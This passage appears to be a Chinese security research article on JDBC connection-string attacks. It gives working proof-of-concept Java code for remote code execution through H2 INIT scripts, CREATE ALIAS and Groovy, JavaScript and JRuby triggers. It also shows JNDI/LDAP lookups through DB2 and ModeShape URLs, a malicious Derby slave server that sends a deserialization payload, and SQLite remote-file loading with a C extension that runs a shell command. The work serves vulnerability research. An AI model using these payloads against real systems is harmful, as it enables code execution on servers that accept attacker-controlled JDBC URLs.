5.1.40\njdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true\n5.1.19 - 5.1.28\njdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true\n5.1.x - 5.1.18\n不可用\n5.0.x\n不可用"},"articles/security/java/jdbc/Part-II-Make-JDBC-Attacks-Brilliant-Again":{"title":"Part-II Make JDBC Attacks Brilliant Again","links":["cheat-sheets/Following-List"],"tags":["jdbc"],"content":"HITB SECCONF Singapore-2021 上由阿里巴巴云安全团队的 Litch1 &amp; pyn3rd 进行了拓展和延伸。其中提到了除 MySQL Connector 之外的诸多主流驱动存在的安全问题。\n\n PPT： conference.hitb.org/hitbsecconf2021sin/materials/D1T2 - Make JDBC Attacks Brilliant Again - Xu Yuanzhen &amp; Chen Hongkun.pdf\n\nSpring Boot H2 Console\n\nH2 Database 是一个纯 Java 实现的符合 JDBC 标准的数据库引擎。\n\nH2 中有一个类 RunScript，用于执行 SQL 脚本。同时 H2 支持一个特性，在 发起连接时执行 SQL 脚本『通过 INIT 属性』，可执行多个脚本（文件），通过分号进行分隔。\njdbc:h2:mem:test;INIT=create schema if not exists test\\;runscript from &#039;~/sql/init.sql&#039;\n\nRUNSCRIPT FROM\nRUNSCRIPT FROM 用于从文件中读取并执行其中的 SQL 语句。并且最重要的是，RUNSCRIPT FROM 可以加载远程文件。\n\nRuns a SQL script from a file. The script is a text file containing SQL statements; each statement must end with ’;‘. This command can be used to restore a database from a backup. The password must be in single quotes; it is case sensitive and can contain spaces. Instead of a file name, a URL may be used.\n\n那么可以使用 CREATE ALIAS 语句构造一个恶意的 SQL 脚本，在连接时，下载该脚本并执行。\nCREATE ALIAS\nH2 文档中 CREATE ALIAS 语句的语法格式如下，\nCREATE ALIAS [ IF NOT EXISTS ] [schemaName.]functionAliasName\n[ DETERMINISTIC ]\n{ FOR classAndMethodString | AS sourceCodeString }\nCREATE ALIAS 语句用于创建方法别名，并自定义方法。在定义的方法中，调用的其它方法需要是 public 且 static 的。并且所有类需要使用全限定名称，且位于 classpath 中。\n\n需要注意，方法必须有返回值，且需要和传入参数的类型一致。\n\n构造如下 SQL 脚本用于执行命令。\nCREATE ALIAS EXEC AS &#039;String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return &quot;trganda&quot;;}&#039;;CALL EXEC (&#039;open -a Calculator.app&#039;)\n\n示例代码如下\n\n测试环境 com.h2database.h2:2.1.214\n\n@Test\npublic void runScript() throws SQLException {\n\tString payload = &quot;INIT=RUNSCRIPT FROM &#039;http://127.0.0.1:8001/poc.sql&#039;&quot;;\n\t// TRACE_LEVEL_SYSTEM_OUT=3; 打印日志\n\tString connectionUrl = &quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;&quot; + payload;\n \n\tConnection connection = DriverManager.getConnection(connectionUrl, &quot;sa&quot;, &quot;&quot;);\n\tconnection.close();\n}\n代码分析\n\n测试环境 com.h2database.h2:2.1.214\n\nINIT 参数的读取位于 org.h2.engine.ConnectionInfo#readSettingsFromURL。\nprivate void readSettingsFromURL() {\n\tDbSettings defaultSettings = DbSettings.DEFAULT;\n\tint idx = url.indexOf(&#039;;&#039;);\n\tif (idx &gt;= 0) {\n\t\tString settings = url.substring(idx + 1);\n\t\turl = url.substring(0, idx);\n\t\tString unknownSetting = null;\n\t\t// split setting\n\t\tString[] list = StringUtils.arraySplit(settings, &#039;;&#039;, false); // [1]\n\t\tfor (String setting : list) {\n\t\t\t// ...\n\t\t\tif (isKnownSetting(key) || defaultSettings.containsKey(key)) {\n\t\t\t\tString old = prop.getProperty(key);\n\t\t\t\tif (old != null &amp;&amp; !old.equals(value)) {\n\t\t\t\t\tthrow DbException.get(ErrorCode.DUPLICATE_PROPERTY_1, key);\n\t\t\t\t}\n\t\t\t\tprop.setProperty(key, value);\nINIT 内容的执行入口则位于 org.h2.engine.Engine#openSession [2]，此时只是创建 Session，但并未进行用户名和密码的验证，所以可以直接利用。\nprivate static SessionLocal openSession(ConnectionInfo ci) {\n\t// ...\n\tString init = ci.removeProperty(&quot;INIT&quot;, null);\n\tSessionLocal session;\n\tlong start = System.nanoTime();\n\tfor (;;) {\n\t\t// create session, no validate user name and password right now\n\t\tsession = openSession(ci, ifExists, forbidCreation, cipher);\n\t\t// ...\n\t}\n\tsynchronized (session) {\n\t\t// ...\n\t\tif (init != null) {\n\t\t\ttry {\n\t\t\t\tCommandInterface command = session.prepareLocal(init); // [3]\n\t\t\t\tcommand.executeUpdate(null); // [2]\n本地化利用\n前面的利用方式需要外连，发起网络连接。本地化的利用方法会更加实用，前面之所以通过加载外部 SQL 语句的方式进行命令执行的原因是，[2] 只执行单行语句『 PPT 中描述的』。\n为此作者对 CREATE ALIAS 的源码部分进行分析，发现可以使用 Groovy Assert 或者 ScriptEngine 进行代码执行。\n多语句\n但实际上还有一种更简单的方式，见下面的代码\n@Test\npublic void crateAlias() throws SQLException {\n\tString payload =\n\t\t\t&quot;INIT=CREATE ALIAS EXEC AS &#039;String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\\\;return \\&quot;trganda\\&quot;\\\\;}&#039;\\\\;CALL EXEC (&#039;open -a Calculator.app&#039;)&quot;;\n \n\tString connectionUrl = &quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;&quot; + payload;\n \n\tConnection connection = DriverManager.getConnection(connectionUrl, &quot;sa&quot;, &quot;&quot;);\n\tconnection.close();\n}\n前面已经提过 INIT 参数支持执行多个语句并通过 ; 进行分隔，但是需要注意的是，要添加 \\。原因是在 readSettingsFromURL 中 [1]，会通过 ; 分隔多个设置参数，所以如果想保留原本的含义，需要转义。\n其次，虽然 CommandInterface#executeUpdate [2] 只执行单行 SQL 语句，但并不代表它不能执行多个语句，只需通过 ; 放在一行中即可。 若存在多个语句，[3] 则会构造一个 CommandList，它继承了 Command 类。\nSourceCompiler\n前面介绍了 CREATE ALIAS 语句，它的具体实现位于 org.h2.command.ddl.CreateFunctionAlias 『其它命令的实现都位于 org.h2.command 包中』。\n其 update 方法如下，\n@Override\npublic long update() {\n\tsession.getUser().checkAdmin();\n\tDatabase db = session.getDatabase();\n\tSchema schema = getSchema();\n\tif (schema.findFunctionOrAggregate(aliasName) != null) {\n\t\t// ...\n\t} else {\n\t\tint id = getObjectId();\n\t\tFunctionAlias functionAlias;\n\t\tif (javaClassMethod != null) {\n\t\t\tfunctionAlias = FunctionAlias.newInstance(schema, id, aliasName, javaClassMethod, force);\n\t\t} else {\n\t\t\tfunctionAlias = FunctionAlias.newInstanceFromSource(schema, id, aliasName, source, force); // [3]\n\t\t}\n\t\tfunctionAlias.setDeterministic(deterministic);\n\t\tdb.addSchemaObject(session, functionAlias);\n\t}\n\treturn 0;\n}\n前面示例代码中创建的 Alias 是通过 Source 创建的，所以会进入 [3]，调用 FunctionAlias#newInstanceFromSource，创建用户定义的方法，调用链会来到 FunctionAlias#loadFromSource，\nprivate void loadFromSource() {\n\tSourceCompiler compiler = database.getCompiler(); // [4]\n\tsynchronized (compiler) {\n\t\tString fullClassName = Constants.USER_PACKAGE + &quot;.&quot; + getName();\n\t\tcompiler.setSource(fullClassName, source); // [5]\n\t\ttry {\n\t\t\tMethod m = compiler.getMethod(fullClassName); // [6]\n\t\t\tJavaMethod method = new JavaMethod(m, 0);\n\t\t\tjavaMethods = new JavaMethod[] {\n\t\t\t\t\tmethod\n\t\t\t};\n\t\t// ...\n\t}\n}\n[4] 获取编译类 SourceCompiler，[5] 设置待编译的源码，并在 [6] 调用 SourceCompiler#getMethod 获取编译后的方法。而在 SourceCompiler#getClass 方法中，[7] 会判断源代码是否为 Groovy 形式。\npublic Class&lt;?&gt; getClass(String packageAndClassName)\n            throws ClassNotFoundException {\n \n\tClass&lt;?&gt; compiledClass = compiled.get(packageAndClassName);\n\tif (compiledClass != null) {\n\t\treturn compiledClass;\n\t}\n\tString source = sources.get(packageAndClassName);\n\tif (isGroovySource(source)) { // [7]\n\t\tClass&lt;?&gt; clazz = GroovyCompiler.parseClass(source, packageAndClassName);\n\t\tcompiled.put(packageAndClassName, clazz);\n\t\treturn clazz;\n\t}\n\t// ...\n}\n \n \nprivate static boolean isGroovySource(String source) {\n\treturn source.startsWith(&quot;//groovy&quot;) || source.startsWith(&quot;@groovy&quot;);\n}\n这意味着，可以使用 groovy 代码。\n\n关于这一点，在 H2 的 文档 中也有提及。\nIf you have the Groovy jar in your classpath, it is also possible to write methods using Groovy.\n\n不过如果仔细阅读文档，除了 groovy。在 CREATE TRIGGER 中还能使用 javascript(ScriptEngine)『通过前缀 //javascript』 和 ruby(JRuby)『通过前缀 #ruby』，需要管理员权限。\n这一点在 SourceCompiler 的源代码中也有体现\nprivate static boolean isJavascriptSource(String source) {\n\treturn source.startsWith(&quot;//javascript&quot;);\n}\n \nprivate static boolean isRubySource(String source) {\n\treturn source.startsWith(&quot;#ruby&quot;);\n}\nGroovy\n\n测试环境 com.h2database.h2:2.1.214\n\n了解了调用过程，就可以构造利用语句了，作者利用的是 assert 方法。\n@Test\npublic void groovyAsset() throws SQLException {\n\tString groovy =\n\t\t\t&quot;@groovy.transform.ASTTest(value={&quot;\n\t\t\t\t\t+ &quot; assert java.lang.Runtime.getRuntime().exec(\\&quot;open -a Calculator\\&quot;)&quot;\n\t\t\t\t\t+ &quot;})&quot;\n\t\t\t\t\t+ &quot;def x&quot;;\n\tString url =\n\t\t\t&quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS T5 AS &#039;&quot;\n\t\t\t\t\t+ groovy\n\t\t\t\t\t+ &quot;&#039;&quot;;\n \n\tConnection conn = DriverManager.getConnection(url);\n\tconn.close();\n}\nScriptEngine\n\n测试环境 com.h2database.h2:1.4.199\n\n如前所述，使用 ScriptEngine 的方式有两种，Javascript 和 JRuby。需要注意的是，下面的两种 Poc 都无法在 H2 当前最新版本（2.1.214）下使用『后面会提』。\nJavascript 如下，\n@Test\npublic void js() throws SQLException {\n\tString javascript =\n\t\t\t&quot;//javascript\\njava.lang.Runtime.getRuntime().exec(\\&quot;open -a Calculator.app\\&quot;)&quot;;\n \n\t// work on old h2 version\n\t// String oldUrl =\n\t//            &quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;MODE=MSSQLServer;INIT=CREATE\n\t// TRIGGER POC BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS &#039;&quot;\n\t//                + javascript\n\t//                + &quot;&#039;&quot;;\n \n\tString url =\n\t\t\t&quot;jdbc:h2:mem:db;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE SCHEMA IF NOT EXISTS db\\\\;CREATE TABLE db.TEST(ID INT PRIMARY KEY, NAME VARCHAR(255))\\\\;CREATE TRIGGER POC BEFORE SELECT ON db.TEST AS &#039;&quot;\n\t\t\t\t\t+ javascript\n\t\t\t\t\t+ &quot;&#039;&quot;;\n \n\tConnection conn = DriverManager.getConnection(url);\n\tconn.close();\n}\nJRuby 代码如下，需要下载 JRuby 并将其添加至 classpath，使用 IDEA 的话直接添加至当前项目的依赖即可。\n@Test\npublic void ruby() throws SQLException {\n\tString ruby =\n\t\t\t&quot;#ruby\\nrequire \\&quot;java\\&quot;\\njava.lang.Runtime.getRuntime().exec(\\&quot;open -a Calculator.app\\&quot;)&quot;;\n\tString url =\n\t\t\t&quot;jdbc:h2:mem:db;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE SCHEMA IF NOT EXISTS db\\\\;CREATE TABLE db.TEST(ID INT PRIMARY KEY, NAME VARCHAR(255))\\\\;CREATE TRIGGER POC BEFORE SELECT ON db.TEST AS &#039;&quot;\n\t\t\t\t\t+ ruby\n\t\t\t\t\t+ &quot;&#039;&quot;;\n \n\tConnection conn = DriverManager.getConnection(url);\n\tconn.close();\n}\n如何触发 Trigger\n首先，需要明确 Trigger 的创建和调用过程，Trigger 在创建的过程中，就会被执行一次。所以，只需要保证 CREATE TRIGGER 语句自身没有语法错误即可。\n在 PPT 中，作者是通过设置 MODE=MSSQLServer; 属性『开启 MySQL 兼容模式』，并将触发器条件设置为 BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS，其中使用了 MySQL 数据库中的表名 INFORMATION_SCHEMA.CATALOGS。\n不过该方法在新版本 H2 下不可用，所以需要一种更通用的方法，具体见下面的代码。通过 INIT 执行多语句，创建一个数据库和表，从而确保它存在，并在后续 CREATE TRIGGER 语句中使用。\npublic class Poc {\n    @Test\n    public void jsPoc() throws ClassNotFoundException, SQLException {\n        Class.forName(&quot;org.h2.Driver&quot;);\n \n        String javascript =\n                &quot;//javascript\\njava.lang.Runtime.getRuntime().exec(\\&quot;open -a Calculator.app\\&quot;)&quot;;\n        String url =\n                &quot;jdbc:h2:mem:db;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE SCHEMA IF NOT EXISTS db\\\\;CREATE TABLE db.TEST(ID INT PRIMARY KEY, NAME VARCHAR(255))\\\\;CREATE TRIGGER POC BEFORE SELECT ON db.TEST AS &#039;&quot;\n                        + javascript\n                        + &quot;&#039;&quot;;\n \n        Connection conn = DriverManager.getConnection(url);\n        conn.close();\n    }\n}\nH2 Settings\n在 URL 连接串中有如下可用设置选项，其中的 JAVA_OBJECT_SERIALIZER 和 JMX 可以作为其它攻击方式进行研究。\n\n 0 = &quot;JAVA_OBJECT_SERIALIZER&quot;\n 1 = &quot;CREATE&quot;\n 2 = &quot;MODE&quot;\n 3 = &quot;MAX_MEMORY_UNDO&quot;\n 4 = &quot;CREATE_BUILD&quot;\n 5 = &quot;TIME ZONE&quot;\n 6 = &quot;DEFAULT_LOCK_TIMEOUT&quot;\n 7 = &quot;ACCESS_MODE_DATA&quot;\n 8 = &quot;AUTO_SERVER_PORT&quot;\n 9 = &quot;CATALOG&quot;\n 10 = &quot;OPTIMIZE_REUSE_RESULTS&quot;\n 11 = &quot;DB_CLOSE_DELAY&quot;\n 12 = &quot;RECOVER&quot;\n 13 = &quot;CLUSTER&quot;\n 14 = &quot;MAX_OPERATION_MEMORY&quot;\n 15 = &quot;CACHE_TYPE&quot;\n 16 = &quot;REFERENTIAL_INTEGRITY&quot;\n 17 = &quot;TRACE_MAX_FILE_SIZE&quot;\n 18 = &quot;TRACE_LEVEL_SYSTEM_OUT&quot;\n 19 = &quot;AUTO_RECONNECT&quot;\n 20 = &quot;OPEN_NEW&quot;\n 21 = &quot;TRACE_LEVEL_FILE&quot;\n 22 = &quot;MAX_MEMORY_ROWS&quot;\n 23 = &quot;NON_KEYWORDS&quot;\n 24 = &quot;LOCK_TIMEOUT&quot;\n 25 = &quot;RETENTION_TIME&quot;\n 26 = &quot;QUERY_STATISTICS&quot;\n 27 = &quot;INIT&quot;\n 28 = &quot;PASSWORD&quot;\n 29 = &quot;MAX_LENGTH_INPLACE_LOB&quot;\n 30 = &quot;LAZY_QUERY_EXECUTION&quot;\n 31 = &quot;PAGE_SIZE&quot;\n 32 = &quot;AUTO_SERVER&quot;\n 33 = &quot;AUTOCOMMIT&quot;\n 34 = &quot;THROTTLE&quot;\n 35 = &quot;BUILTIN_ALIAS_OVERRIDE&quot;\n 36 = &quot;IGNORE_UNKNOWN_SETTINGS&quot;\n 37 = &quot;READONLY&quot;\n 38 = &quot;AUTHZPWD&quot;\n 39 = &quot;AUTHENTICATOR&quot;\n 40 = &quot;NETWORK_TIMEOUT&quot;\n 41 = &quot;@&quot;\n 42 = &quot;TRUNCATE_LARGE_LENGTH&quot;\n 43 = &quot;COLLATION&quot;\n 44 = &quot;MAX_LOG_SIZE&quot;\n 45 = &quot;VARIABLE_BINARY&quot;\n 46 = &quot;QUERY_STATISTICS_MAX_ENTRIES&quot;\n 47 = &quot;RECOVER_TEST&quot;\n 48 = &quot;WRITE_DELAY&quot;\n 49 = &quot;ALLOW_LITERALS&quot;\n 50 = &quot;FORBID_CREATION&quot;\n 51 = &quot;PASSWORD_HASH&quot;\n 52 = &quot;SCHEMA&quot;\n 53 = &quot;CACHE_SIZE&quot;\n 54 = &quot;QUERY_TIMEOUT&quot;\n 55 = &quot;IFEXISTS&quot;\n 56 = &quot;DEFAULT_TABLE_TYPE&quot;\n 57 = &quot;LOCK_MODE&quot;\n 58 = &quot;EXCLUSIVE&quot;\n 59 = &quot;FILE_LOCK&quot;\n 60 = &quot;OLD_INFORMATION_SCHEMA&quot;\n 61 = &quot;NO_UPGRADE&quot;\n 62 = &quot;USER&quot;\n 63 = &quot;IGNORECASE&quot;\n 64 = &quot;DATABASE_EVENT_LISTENER&quot;\n 65 = &quot;IGNORE_CATALOGS&quot;\n 66 = &quot;DEFAULT_NULL_ORDERING&quot;\n 67 = &quot;JMX&quot;\n 68 = &quot;CIPHER&quot;\n 69 = &quot;AUTHREALM&quot;\n 70 = &quot;REDO_LOG_BINARY&quot;\n 71 = &quot;SCHEMA_SEARCH_PATH&quot;\n\n参数\n\nspring.h2.console.enabled=true\nspring.h2.console.settings.web-allow-others=true\n\njdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#039;http://127.0.0.1:8000/poc.sql&#039;\n\npoc.sql 中的 payload 可使用 Groovy AST Transformations，但 Groovy 依赖不常见，提出了另一种方式\n\norg.h2.util.SourceCompiler，还可以借助 ScriptEngine 执行 js 代码。\n\npublic static void main (String[] args) throws ClassNotFoundException, SQLException {\n\tString javascript = &quot;//javascript\\njava.lang.Runtime.getRuntime().exec(\\&quot;open -a Calculat\n\tor\\&quot;)&quot;;\n\tString url = &quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS &#039;&quot; + javascript + &quot;&#039;&quot;;\n\tConnection conn = DriverManager.getConnection(url);\n\tconn.close();\nIBM DB2\nDB2 是 IBM 旗下的一款 Cloud-Native 数据库产品，支持 JDBC。连接串的 语法 如下，属性设置由 : 进行分隔。\njdbc:db2://host[:50001][/schema][:name=value[;name=value ...]]\n\n作者在 PPT 中提到了如下属性，\n\nclientRerouteServerListJNDIName：根据文档，该参数表示一个类型为 DB2ClientRerouteServerList 的 JNDI 引用对象，它内部包含 reroute server 的相关信息『为负载均衡和容灾提供支持』。如果不为 null，则提供如下功能\n\nAllows information about reroute servers to persist across JVMs\nProvides an alternate server location if the first connection to the data source fails\n\n\n\n既然是 JNDI 引用，那一定存在存在 lookup 调用，位于 com.ibm.db2.jcc.am.c0。\n\nDB2 Driver 是闭源的，大部分代码可能会反编译失败，更多的靠文档和黑盒测试。\n\npublic class c0 implements PrivilegedExceptionAction {\n    private Context a = null;\n    private String b;\n \n    public c0(Context var1, String var2) {\n        this.a = var1;\n        this.b = var2;\n    }\n \n    public Object run() throws NamingException {\n        return this.a.lookup(this.b);\n    }\n}\nPoc 代码如下\n@Test\npublic void db2() throws SQLException {\n\tString url =\n\t\t\t&quot;jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:1389/evilClass;&quot;;\n\tDriverManager.getConnection(url);\n}\nJava Content Repository\nJCR（内容存储仓库）是在 JSR 170 和 JSR 283 中定义的一项标准的 Java 接口。支持用于访问多种层次结构的数据源，包括文件系统，关系数据库或 XML 文档。\n\n引用 JCR 的规范：JCR 是一个高级信息管理系统，是传统数据存储库的超集。\n\nPPT 中列出了 JCR 的多个实现：\n\nJackrabbit (Apache)\nCRX (Adobe)\nModeShape\neXo Platform\nOracle Beehive\n\n重点关注 ModeShape，在 官方文档 中提到，使用 JDBC 时数据源需指定为 JNDI URI。并给出了 URL 的格式 jdbc:jcr:jndi:jcr:?repositoryName=『大概只是建议的格式』\n实际查看代码，只在创建 RepositoryDelegate 时，会检查 URL 是否以 jdbc:jcr:jndi: 开头 [8] &amp; [9]\npublic RepositoryDelegate createRepositoryDelegate( String url,\n                                                        Properties info,\n                                                        JcrContextFactory contextFactory ) throws SQLException {\n\tif (!acceptUrl(url)) { // [8]\n\t\tthrow new SQLException(JdbcLocalI18n.invalidUrlPrefix.text(LocalJcrDriver.JNDI_URL_PREFIX));\n\t}\n\treturn create(determineProtocol(url), url, info, contextFactory);\n}\n \nprotected int determineProtocol( String url ) {\n\tassert url != null;\n\tassert url.length() != 0;\n\t// [9] LocalJcrDriver.JNDI_URL_PREFIX = &quot;jdbc:jcr:jndi:&quot;\n\tif (url.startsWith(LocalJcrDriver.JNDI_URL_PREFIX) &amp;&amp; url.length() &gt; LocalJcrDriver.JNDI_URL_PREFIX.length()) {\n\t\t// This fits the pattern so far ...\n\t\treturn PROTOCOL_JNDI;\n\t}\n\treturn PROTOCOL_UNKNOWN;\n}\n后续直到 lookup 调用前 [10]，都没有其它格式上的检查。\nprotected void initRepository() throws SQLException {\n\t// ...\n\t// Look up the object in JNDI and find the JCR Repository object ...\n\tString jndiName = connInfo.getRepositoryPath();\n\t// ...\n \n\tContext context = null;\n\ttry {\n\t\tcontext = this.jcrContext.createContext(connInfo.getProperties());\n\t} catch (NamingException e) {\n\t\tthrow new SQLException(JdbcLocalI18n.unableToGetJndiContext.text(e.getLocalizedMessage()));\n\t}\n \n\tString repositoryName = &quot;NotAssigned&quot;;\n\ttry {\n\t\tObject target = context.lookup(jndiName); // [10]\nPoc 代码如下\n\n测试环境 modeshape-jdbc:5.4.1.Final\n\n@Test\npublic void modeshape() throws SQLException {\n\tString url = &quot;jdbc:jcr:jndi:ldap://127.0.0.1:1389/evilClass&quot;;\n\tDriverManager.getConnection(url);\n}\nApache Derby\n作者在 org.apache.derby.impl.store.replication.net.Socketconnection 中找到一个 readMessage 方法，其中存在反序列化调用。\npublic Object readMessage() throws ClassNotFoundException, IOException {\n\treturn this.objInputStream.readObject();\n}\n并发现 org.apache.derby.impl.store.replication.net.MasterReceiverThread 中会调用 readMessage 方法 [11]\npublic void run() {\n\twhile(!ReplicationMessageTransmit.this.stopMessageReceiver) {\n\t\ttry {\n\t\t\tReplicationMessage var1 = this.readMessage(); // [11]\n而 MasterReceiverThread 的调用需要如下参数\n\nstartMaster=true：表示开启 master 模式。\nslaveHost=&lt;slave_ip&gt;\n\nPoc 代码如下\n\n测试环境 derby:10.14.2.0\n\n@BeforeAll\npublic static void startSlave() {\n\ttry {\n\t\tDriverManager.getConnection(&quot;jdbc:derby:db;create=true&quot;);\n\t} catch (SQLException e) {\n\t\t// ttk...\n\t}\n\tserver = new SlaveServer(4851);\n}\n \n@AfterAll\npublic static void stopServer() {\n\tserver.close();\n}\n \n@Test\npublic void derby() throws SQLException {\n\tDriverManager.getConnection(&quot;jdbc:derby:db;startMaster=true;slaveHost=127.0.0.1&quot;);\n}\n恶意 slave 服务\npublic class SlaveServer implements AutoCloseable {\n \n    private static final Logger logger = LoggerFactory.getLogger(SlaveServer.class);\n    private final Channel channel;\n    private final EventLoopGroup parentGroup;\n    private final EventLoopGroup childGroup;\n \n    public SlaveServer(int port) {\n        parentGroup = new NioEventLoopGroup();\n        childGroup = new NioEventLoopGroup();\n        final ChannelFuture channelFuture =\n                new ServerBootstrap()\n                        .group(parentGroup, childGroup)\n                        .channel(NioServerSocketChannel.class)\n                        .handler(new LoggingHandler(LogLevel.INFO))\n                        .childHandler(\n                                new ChannelInitializer&lt;NioSocketChannel&gt;() {\n                                    @Override\n                                    protected void initChannel(NioSocketChannel ch)\n                                            throws Exception {\n                                        final ChannelPipeline pipeline = ch.pipeline();\n                                        pipeline.addLast(new SlaveServerHandler());\n                                    }\n                                })\n                        .bind(port);\n        channel = channelFuture.channel();\n        channelFuture.awaitUninterruptibly();\n    }\n \n    @Override\n    public void close() {\n        channel.close();\n        childGroup.shutdownGracefully().awaitUninterruptibly();\n        parentGroup.shutdownGracefully().awaitUninterruptibly();\n    }\n \n    private static class SlaveServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            logger.info(&quot;channelActive&quot;);\n            try (InputStream stream =\n                    SlaveServer.class.getClassLoader().getResourceAsStream(&quot;cc5.bin&quot;)) {\n                assert stream != null;\n                byte[] bytes = new byte[stream.available()];\n                stream.read(bytes);\n \n                ByteBuf buf = ctx.alloc().buffer(bytes.length);\n                buf.writeBytes(bytes);\n \n                ctx.writeAndFlush(buf);\n                logger.info(&quot;response payload with cc5&quot;);\n            } catch (Exception e) {\n                // ttk...\n            }\n        }\n \n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) throws Exception {\n            logger.info(&quot;Server channel inactive&quot;);\n        }\n    }\n}\nSQLite\n\n分析版本 sqlite-jdbc:3.8.9\n\n从 SQLite JDBC Driver 的 Usage 文档 中可以看到，它能够加载远程文件\nConnection conn = DriverManager.getConnection(&quot;jdbc:sqlite::resource:www.xerial.org/svn/project/XerialJ/trunk/sqlite-jdbc/src/test/java/org/sqlite/sample.db&quot;);\n \nConnection conn = DriverManager.getConnection(&quot;jdbc:sqlite::resource:jar:www.xerial.org/svn/project/XerialJ/trunk/sqlite-jdbc/src/test/resources/testdb.jar!/sample.db&quot;);\n相关代码位于 org.sqlite.core.CoreConnection#open 中的 [16]，调用链 JDBC#createConnection-&gt;SQLiteConnection-&gt;JDBC4Connection-&gt;JDBC3Connection-&gt;CoreConnection，如果 URL 可控，可以把它理解成一个 SSRF 漏洞。\nprivate void open(int openModeFlags, int busyTimeout) throws SQLException {\n\t// check the path to the file exists\n\tif (!&quot;:memory:&quot;.equals(fileName) &amp;&amp; !fileName.startsWith(&quot;file:&quot;) &amp;&amp; !fileName.contains(&quot;mode=memory&quot;)) {\n\t\tif (fileName.startsWith(RESOURCE_NAME_PREFIX)) {\n\t\t\tString resourceName = fileName.substring(RESOURCE_NAME_PREFIX.length());\n \n\t\t\t// search the class path\n\t\t\tClassLoader contextCL = Thread.currentThread().getContextClassLoader();\n\t\t\tURL resourceAddr = contextCL.getResource(resourceName);\n\t\t\tif (resourceAddr == null) {\n\t\t\t\ttry {\n\t\t\t\t\tresourceAddr = new URL(resourceName);\n\t\t\t\t}\n\t\t\t\tcatch (MalformedURLException e) {\n\t\t\t\t\tthrow new SQLException(String.format(&quot;resource %s not found: %s&quot;, resourceName, e));\n\t\t\t\t}\n\t\t\t}\n \n\t\t\ttry {\n\t\t\t\tfileName = extractResource(resourceAddr).getAbsolutePath(); // [16]\n\t\t\t}\n利用则借助了 SELECT code_execution FROM * USING SQLite; - Check Point Research 中描述的方法利用 db 文件加载时的逻辑，通过 CREATE VIEW 劫持一般的 SELECT 查询，并将实际执行的查询语句替换为 SELECT load_extension(&#039;&lt;ext_path&gt;&#039;, &#039;&lt;entry_point&gt;&#039;)。\n\n见 load_extension functions。\n\n但是这种利用场景未免太难了点，除了 URL 可控，还需要一个可控的 extension 文件，在仔细阅读 PPT 和 pyn3rd 的文章 Make JDBC Attacks Brilliant Again I 后都没有找到更多的细节。他们只是假设，有一个可控的 extension 文件，这意味着需要一个文件上传漏洞。那么有没有办法只借助 SQLite Driver 达到这一点？\n文件上传\n为了解决前面的问题，翻看了 SQLite Driver 的源代码后发现，其实前面提到的 SSRF 漏洞就可以实现文件上传。\n跟入 [16] 中调用的方法 extractResource，如果你仔细阅读这段代码就知道文件上传是可能的。通过控制 URL 可以将文件 [17] 写入 System.getProperty(&quot;java.io.tmpdir&quot;) + String.format(&quot;sqlite-jdbc-tmp-%d.db&quot;, resourceAddr.hashCode()，但写入的文件有 8K 大小的限制 [18]『足够用了』。\nprivate File extractResource(URL resourceAddr) throws IOException {\n\t// ...\n \n\tString tempFolder = new File(System.getProperty(&quot;java.io.tmpdir&quot;)).getAbsolutePath();\n\tString dbFileName = String.format(&quot;sqlite-jdbc-tmp-%d.db&quot;, resourceAddr.hashCode());\n\tFile dbFile = new File(tempFolder, dbFileName); // [17]\n \n\t// ...\n \n\tbyte[] buffer = new byte[8192]; // 8K buffer // [18]\n\tFileOutputStream writer = new FileOutputStream(dbFile);\n\tInputStream reader = resourceAddr.openStream();\n\ttry {\n\t\tint bytesRead = 0;\n\t\twhile ((bytesRead = reader.read(buffer)) != -1) {\n\t\t\twriter.write(buffer, 0, bytesRead);\n\t\t}\n\t\treturn dbFile;\n文件名的命名为\nSystem.getProperty(&quot;java.io.tmpdir&quot;) + String.format(&quot;sqlite-jdbc-tmp-%d.db&quot;, resourceAddr.hashCode()\n这个路径，不难猜测到。resourceAddr 可控，可以计算出它的 hashCode，java.io.tmpdir 呢？根据 java.io.File (Java Platform SE 8 ) 中的描述，在 Linux 和 Windows 中，通常为\n\nLinux： &quot;/tmp&quot; 或 &quot;/var/tmp&quot;\nWindows： &quot;C:\\\\WINNT\\\\TEMP&quot;\nMac：路径中带有随机生成的部分，不可预测，如 /var/folders/zq/bnfkv60s36z0lqyt0csfv68m0000gn/T/。\n\nLoad Extension\n那么这里可以假定，这个路径是能够被攻击者猜测到的，不过有一个问题，这个文件的后缀是固定为 .db 的，它能够被 load_extension 加载吗？下面编写一个 extension 进行测试，代码如下\n\n测试环境为 Ubuntu 22.04 x86_64，编译前需要安装依赖 libsqlite3-dev。不建议在 Arm 系列的 Mac 中进行复现，因为 sqlite-jdbc.jar 中自带的 native 文件只支持 32 位和 64 位，\n\n#include &lt;sqlite3ext.h&gt;\n#include &lt;stdlib.h&gt;\nSQLITE_EXTENSION_INIT1\n \n#ifdef _WIN32\n__declspec(dllexport)\n#endif\nint poc( /* &lt;== Change this name, maybe */\n  sqlite3 *db,\n  char **pzErrMsg,\n  const sqlite3_api_routines *pApi\n){\n  int rc = SQLITE_OK;\n  SQLITE_EXTENSION_INIT2(pApi);\n  /* insert code to initialize your extension here */\n \n  system(&quot;touch /tmp/poc_trganda&quot;);\n \n  return rc;\n}\n编译得到 poc.so 